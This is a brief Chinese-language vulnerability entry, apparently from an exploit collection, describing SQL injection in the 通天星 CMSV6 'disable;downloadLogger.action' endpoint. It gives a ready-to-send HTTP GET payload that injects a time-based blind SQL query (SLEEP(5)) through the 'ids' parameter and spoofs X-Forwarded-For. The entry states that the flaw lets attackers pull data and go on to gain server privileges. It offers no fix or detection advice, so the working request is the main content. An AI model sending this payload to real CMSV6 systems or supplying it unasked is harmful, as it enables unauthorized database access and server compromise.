**漏洞描述：**

通天星CMSV6接口disable;downloadLogger.action存在sql注入，攻击者可以通过拼接恶意SQL语句获取数据，进一步获取服务器权限。

**影响版本：**

通天星CMSV6

**Payload：**

```
GET/edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29HTTP/1.1
Host:192.168.52.130
User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection:close
X-Forwarded-For:127.0.0.1
Accept-Encoding:gzip, deflate
```

---
